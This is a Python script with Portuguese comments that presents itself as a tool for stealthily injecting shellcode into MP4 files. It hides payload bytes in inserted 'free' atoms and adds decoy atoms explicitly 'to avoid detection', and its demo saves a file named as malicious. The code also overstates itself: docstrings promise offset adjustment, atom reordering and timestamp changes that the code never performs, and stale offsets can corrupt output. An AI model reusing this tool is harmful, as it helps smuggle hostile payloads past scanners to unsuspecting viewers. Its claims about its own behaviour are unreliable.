#!/usr/bin/env python3
"""
Injetor de Payload em Arquivos MP4
Manipula a estrutura MP4 para embutir shellcode de forma furtiva
"""

import struct
import os
from typing import Tuple, List, Dict, Optional
from enum import Enum


class MP4AtomType(Enum):
    """Tipos de atoms (boxes) em arquivos MP4"""
    FTYP = b"ftyp"  # File type
    MDAT = b"mdat"  # Media data
    MOOV = b"moov"  # Movie metadata
    MVHD = b"mvhd"  # Movie header
    TRAK = b"trak"  # Track
    TKHD = b"tkhd"  # Track header
    EDTS = b"edts"  # Edit list
    MDIA = b"mdia"  # Media
    MDHD = b"mdhd"  # Media header
    HDLR = b"hdlr"  # Handler
    MINF = b"minf"  # Media information
    SMHD = b"smhd"  # Sound media header
    VMHD = b"vmhd"  # Video media header
    DINF = b"dinf"  # Data information
    DREF = b"dref"  # Data reference
    STBL = b"stbl"  # Sample table
    STSD = b"stsd"  # Sample description
    STTS = b"stts"  # Decoding time-to-sample
    STSS = b"stss"  # Sync sample
    STSC = b"stsc"  # Sample-to-chunk
    STSZ = b"stsz"  # Sample size
    STCO = b"stco"  # Chunk offset
    FREE = b"free"  # Free space


class MP4Injector:
    """
    Injeta payload em arquivos MP4 de forma furtiva.
    
    Estratégia:
    1. Parse da estrutura MP4 (atoms)
    2. Localização de espaço livre ou metadados
    3. Injeção de payload após estrutura de metadados
    4. Ajuste de offsets se necessário
    5. Preservação de validade do arquivo
    """
    
    def __init__(self, mp4_path: str):
        """
        Inicializa o injetor.
        
        Args:
            mp4_path: Caminho para o arquivo MP4
        """
        self.mp4_path = mp4_path
        self.file_data = bytearray()
        self.atoms = []
        self.payload_offset = 0
        
        # Carregar arquivo
        if os.path.exists(mp4_path):
            with open(mp4_path, "rb") as f:
                self.file_data = bytearray(f.read())
        else:
            raise FileNotFoundError(f"Arquivo MP4 não encontrado: {mp4_path}")
    
    def parse_atoms(self) -> List[Dict]:
        """
        Faz parse da estrutura de atoms do arquivo MP4.
        
        Returns:
            List[Dict]: Lista de atoms encontrados
        """
        
        atoms = []
        offset = 0
        
        while offset < len(self.file_data):
            # Ler tamanho do atom (4 bytes, big-endian)
            if offset + 8 > len(self.file_data):
                break
            
            size = struct.unpack(">I", self.file_data[offset:offset+4])[0]
            atom_type = self.file_data[offset+4:offset+8]
            
            if size == 0:
                # Atom estende até o fim do arquivo
                size = len(self.file_data) - offset
            elif size == 1:
                # Tamanho estendido (64-bit)
                if offset + 16 > len(self.file_data):
                    break
                size = struct.unpack(">Q", self.file_data[offset+8:offset+16])[0]
            
            # Validar tamanho
            if size < 8 or offset + size > len(self.file_data):
                break
            
            atom_info = {
                "type": atom_type,
                "offset": offset,
                "size": size,
                "data": self.file_data[offset+8:offset+size],
            }
            
            atoms.append(atom_info)
            offset += size
        
        self.atoms = atoms
        return atoms
    
    def find_injection_point(self) -> int:
        """
        Encontra o melhor ponto para injetar o payload.
        
        Estratégia:
        1. Procurar por atom 'free' (espaço livre)
        2. Se não encontrar, injetar após 'moov'
        3. Se não encontrar, injetar após 'ftyp'
        
        Returns:
            int: Offset onde injetar o payload
        """
        
        # Procurar por atom 'free'
        for atom in self.atoms:
            if atom["type"] == MP4AtomType.FREE.value:
                return atom["offset"]
        
        # Procurar por atom 'moov' e injetar após ele
        for atom in self.atoms:
            if atom["type"] == MP4AtomType.MOOV.value:
                return atom["offset"] + atom["size"]
        
        # Procurar por atom 'ftyp' e injetar após ele
        for atom in self.atoms:
            if atom["type"] == MP4AtomType.FTYP.value:
                return atom["offset"] + atom["size"]
        
        # Fallback: injetar no final
        return len(self.file_data)
    
    def inject_payload(self, payload: bytes, offset: Optional[int] = None) -> bool:
        """
        Injeta o payload no arquivo MP4.
        
        Args:
            payload: Dados do payload a injetar
            offset: Offset onde injetar (se None, encontra automaticamente)
            
        Returns:
            bool: True se sucesso, False caso contrário
        """
        
        if offset is None:
            offset = self.find_injection_point()
        
        if offset < 0 or offset > len(self.file_data):
            print(f"[!] Offset inválido: {offset}")
            return False
        
        # Criar atom 'free' para armazenar o payload
        # Formato: [tamanho (4 bytes)] [tipo (4 bytes)] [dados]
        
        payload_size = len(payload) + 8  # +8 para header
        
        # Header do atom 'free'
        atom_header = struct.pack(">I", payload_size) + MP4AtomType.FREE.value
        
        # Combinar header + payload
        free_atom = atom_header + payload
        
        # Injetar no arquivo
        self.file_data[offset:offset] = free_atom
        self.payload_offset = offset
        
        print(f"[+] Payload injetado em offset: 0x{offset:x}")
        print(f"[+] Tamanho do atom: {payload_size} bytes")
        
        return True
    
    def inject_after_metadata(self, payload: bytes) -> bool:
        """
        Injeta o payload especificamente após os metadados (moov atom).
        
        Args:
            payload: Dados do payload
            
        Returns:
            bool: True se sucesso
        """
        
        # Procurar pelo atom 'moov'
        moov_offset = None
        for atom in self.atoms:
            if atom["type"] == MP4AtomType.MOOV.value:
                moov_offset = atom["offset"] + atom["size"]
                break
        
        if moov_offset is None:
            print("[!] Atom 'moov' não encontrado")
            return False
        
        return self.inject_payload(payload, moov_offset)
    
    def preserve_mp4_validity(self) -> bool:
        """
        Verifica e preserva a validade do arquivo MP4 após injeção.
        
        Validações:
        1. Verificar assinatura 'ftyp' no início
        2. Verificar integridade de atoms
        3. Ajustar offsets se necessário
        
        Returns:
            bool: True se arquivo é válido
        """
        
        # Verificar assinatura 'ftyp'
        if len(self.file_data) < 8:
            print("[!] Arquivo MP4 muito pequeno")
            return False
        
        # O segundo atom deve ser 'ftyp'
        if self.file_data[4:8] != MP4AtomType.FTYP.value:
            print("[!] Assinatura 'ftyp' não encontrada")
            return False
        
        # Verificar integridade de atoms
        offset = 0
        while offset < len(self.file_data):
            if offset + 8 > len(self.file_data):
                break
            
            size = struct.unpack(">I", self.file_data[offset:offset+4])[0]
            
            if size == 0:
                break
            
            if size < 8:
                print(f"[!] Tamanho de atom inválido em offset 0x{offset:x}")
                return False
            
            offset += size
        
        print("[+] Arquivo MP4 é válido")
        return True
    
    def create_free_atom(self, size: int) -> bytes:
        """
        Cria um atom 'free' com tamanho específico.
        
        Args:
            size: Tamanho desejado do atom (incluindo header)
            
        Returns:
            bytes: Atom 'free' criado
        """
        
        if size < 8:
            size = 8
        
        # Header: tamanho (4 bytes) + tipo (4 bytes)
        header = struct.pack(">I", size) + MP4AtomType.FREE.value
        
        # Preencher com zeros
        padding = b"\x00" * (size - 8)
        
        return header + padding
    
    def obfuscate_structure(self) -> bool:
        """
        Ofusca a estrutura do MP4 para evitar detecção.
        
        Técnicas:
        1. Reordenar atoms não-críticos
        2. Adicionar atoms 'free' extras
        3. Ajustar timestamps
        
        Returns:
            bool: True se sucesso
        """
        
        # Adicionar atom 'free' extra para confundir análise
        free_atom = self.create_free_atom(256)
        
        # Encontrar posição após 'ftyp'
        for atom in self.atoms:
            if atom["type"] == MP4AtomType.FTYP.value:
                insert_offset = atom["offset"] + atom["size"]
                self.file_data[insert_offset:insert_offset] = free_atom
                print(f"[+] Atom 'free' adicional injetado em 0x{insert_offset:x}")
                break
        
        return True
    
    def save_malicious_mp4(self, output_path: str) -> bool:
        """
        Salva o arquivo MP4 modificado.
        
        Args:
            output_path: Caminho para salvar o arquivo
            
        Returns:
            bool: True se sucesso
        """
        
        try:
            with open(output_path, "wb") as f:
                f.write(self.file_data)
            
            file_size = os.path.getsize(output_path)
            print(f"[+] Arquivo salvo: {output_path}")
            print(f"[+] Tamanho: {file_size} bytes")
            
            return True
        
        except Exception as e:
            print(f"[!] Erro ao salvar arquivo: {e}")
            return False
    
    def get_injection_info(self) -> Dict:
        """
        Retorna informações sobre a injeção.
        
        Returns:
            Dict: Informações da injeção
        """
        
        return {
            "original_size": len(self.file_data),
            "payload_offset": self.payload_offset,
            "atoms_count": len(self.atoms),
            "atoms": [
                {
                    "type": atom["type"].decode("utf-8", errors="ignore"),
                    "offset": atom["offset"],
                    "size": atom["size"],
                }
                for atom in self.atoms
            ]
        }


def main():
    """Teste do injetor MP4"""
    
    # Criar arquivo MP4 de teste (mínimo válido)
    test_mp4 = bytearray()
    
    # ftyp atom
    ftyp_data = b"isom\x00\x00\x02\x00isomiso2avc1mp41"
    ftyp_atom = struct.pack(">I", len(ftyp_data) + 8) + b"ftyp" + ftyp_data
    
    # mdat atom (vazio)
    mdat_atom = struct.pack(">I", 8) + b"mdat"
    
    # moov atom (mínimo)
    moov_data = b"\x00" * 100
    moov_atom = struct.pack(">I", len(moov_data) + 8) + b"moov" + moov_data
    
    test_mp4 = ftyp_atom + mdat_atom + moov_atom
    
    # Salvar arquivo de teste
    test_path = "/tmp/test.mp4"
    with open(test_path, "wb") as f:
        f.write(test_mp4)
    
    print("[*] Arquivo MP4 de teste criado")
    
    # Criar injetor
    injector = MP4Injector(test_path)
    
    # Parse atoms
    atoms = injector.parse_atoms()
    print(f"[*] {len(atoms)} atoms encontrados")
    
    for atom in atoms:
        print(f"  - {atom['type'].decode('utf-8', errors='ignore')}: "
              f"offset=0x{atom['offset']:x}, size={atom['size']}")
    
    # Criar payload de teste
    payload = b"EXPLOIT_PAYLOAD_TEST" * 10
    
    # Injetar
    if injector.inject_payload(payload):
        print("[+] Payload injetado com sucesso")
    
    # Verificar validade
    if injector.preserve_mp4_validity():
        print("[+] Arquivo mantém validade MP4")
    
    # Salvar
    output_path = "/tmp/test_malicious.mp4"
    if injector.save_malicious_mp4(output_path):
        print(f"[+] Arquivo salvo: {output_path}")
    
    # Exibir informações
    info = injector.get_injection_info()
    print(f"\n[*] Informações da injeção:")
    print(f"    Tamanho original: {info['original_size']} bytes")
    print(f"    Offset do payload: 0x{info['payload_offset']:x}")
    print(f"    Atoms: {info['atoms_count']}")


if __name__ == "__main__":
    main()
